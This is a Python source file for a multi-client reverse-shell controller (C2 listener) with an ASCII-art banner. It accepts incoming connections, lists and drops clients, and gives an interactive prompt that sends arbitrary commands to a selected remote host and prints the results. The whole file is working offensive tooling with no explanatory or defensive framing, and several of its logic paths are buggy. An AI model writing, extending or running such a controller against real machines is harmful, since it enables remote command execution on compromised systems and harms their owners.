#!/usr/bin/python3
import socket
import sys
import threading
import os

client_list = []
BUFFER_SIZE = 1024 * 128

# Clear screen
def clear():
    print("\033[H\033[J")

# Print menu
def printMenu():
    print("\n[1] List Active Clients")
    print("[2] Remove Connected Client")
    print("[3] Start A Shell With A Client\n")
    print("[X] Exit\n")

# Starts the listener
def startListener(HOST, PORT):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)

    # Accept connections
    while True:
        try:
            conn, addr = s.accept()
        except socket.error:
            print("Cannot assign requested address")
            sys.exit(1)
        finally:
             client_list.append(conn)
        
# List active clients
def returnListOfActiveClients():

    clear()
    activeClients = []

    for i, client in enumerate(client_list): # Enumerate the list of clients, i = index, client = client
        activeClients.append(client.getpeername()) # Append the client's address to the clients list
    return activeClients
    

def printListOfActiveClients(activeClients):

    if not activeClients:
        print(f"No Active Clients")
    else:
        print(f"Number of Clients: {len(activeClients)}")    
        for i, client in enumerate(activeClients): # Enumerate the clients list, i = index, client = client
            print(f"[{i+1}] {client}") # Sample output: [1] ('192.168.128.54', 56777)\
    
def removeClient(activeClients):

    clientID = int(input("\nTo Go Back, Enter '0'\nTo Remove A Client, Type In Their Number: "))

    if clientID == 0: # User Can Return To Menu With '0'
        clear()
        return
    
    clientToRemove = client_list[clientID - 1]

    try:
        clientToRemove.close()
        client_list.remove(clientToRemove)

        print(f"Removed: [{clientID}] {clientToRemove.getpeername()}")
        return activeClients
    
    except Exception as e:
        print(f"Error: {e}")

# Start a shell with a client 
def shell(conn):
    try:
        while True:
            command = input(f"shell > ")
            if command.lower() == "exit":
                break
            # Send the command to the client
            conn.send(command.encode())
            output = conn.recv(BUFFER_SIZE).decode()
            print(output)
    except Exception as e:
        print(f"Error: {e}")
        conn.close()

def main(HOST, PORT):
    isRunning = True
    print("""                             
   _____     __                                .__           
  /  _  \   |  | __ _______  _____      ______ |__| _____    
 /  /_\  \  |  |/ / \_  __ \ \__  \    /  ___/ |  | \__  \   
/    |    \ |    <   |  | \/  / __ \_  \___ \  |  |  / __ \_ 
\____|__  / |__|_ \  |__|    (____  / /____  > |__| (____  / 
        \/       \/               \/       \/            \/  
""")
    # Start the listener as a daemon
    listener = threading.Thread(target=startListener, args=(HOST, PORT))
    listener.daemon = True
    listener.start()
    
    print(f"""                             
Listening: {HOST} : {PORT}\n 
""")
    try:
        activeClients = []

        while isRunning:
            printMenu()
            option = input("Select An Option: ")

            # Check for active clients only once at the beginning of the loop
            if not activeClients:
                activeClients = returnListOfActiveClients()
                print("No Active Clients")
                continue

            match option:
                case "1": # Option: Lists All Connected Clients
                    clear()
                    printListOfActiveClients(activeClients)

                case "2": # Option: Removes A Client
                    clear()
                    printListOfActiveClients(activeClients)
                    activeClients = removeClient(activeClients)

                case "3": # Option: Start A Shell Session With Client
                    clear()

                    printListOfActiveClients(activeClients)

                    clientID = int(input("To Start A Shell, Type In The Client Number: "))
                    selectedClient = client_list[clientID - 1]
                    shell(selectedClient)

                case _:
                    print ("Invalid Option")
    except KeyboardInterrupt:
        print("\n")
        pass



HOST = sys.argv[1]
PORT = int(sys.argv[2])
# HOST = "127.0.0.1"
# PORT = 8080
main(HOST, PORT)
